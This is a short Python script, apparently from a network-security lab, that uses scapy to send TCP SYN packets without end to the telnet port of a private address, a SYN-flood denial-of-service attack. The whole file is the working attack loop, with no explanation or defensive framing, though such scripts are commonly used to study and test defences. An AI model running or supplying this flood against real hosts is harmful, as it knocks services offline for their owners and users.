#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

dst_ip = "10.9.0.5"
src_ip = "10.0.2.15"

ip = IP(dst = dst_ip)
tcp = TCP(dport=23, flags="S")
pkt = ip/tcp
seq = getrandbits(32)

while True:
    pkt[IP].src = src_ip
    #pkt[TCP].sport 
    pkt[TCP].seq = seq
    send(pkt, verbose=0)

